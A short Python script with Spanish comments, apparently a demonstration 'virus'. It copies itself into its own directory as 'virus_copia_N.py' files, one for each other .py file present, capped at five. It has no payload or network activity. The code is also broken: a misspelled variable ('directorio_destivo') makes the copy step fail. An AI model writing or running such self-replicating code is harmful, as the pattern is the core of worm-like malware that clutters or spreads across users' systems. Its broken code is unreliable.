import os
import shutil
import time

def replicar():
    # Obtener la ruta del script actual
    script_path = __file__
    
    # Directorio donde se replicará (actual)
    directorio_destino = os.path.dirname(script_path)
    
    # Lista de archivos existentes para no copiar sobre sí mismo infinitamente en el bucle
    archivos_existentes = os.listdir(directorio_destino)
    
    contador = 0
    
    for archivo in archivos_existentes:
        if archivo.endswith(".py") and archivo != os.path.basename(script_path):
            # Evitar copias infinitas de copias previas en esta ejecución
            if contador < 5:  # Límite para demostración
                shutil.copy2(script_path, os.path.join(directorio_destivo, f"virus_copia_{contador}.py"))
                contador += 1
                
    print(f"[+] Se han creado {contador} copias de sí mismo.")

if __name__ == "__main__":
    replicar()
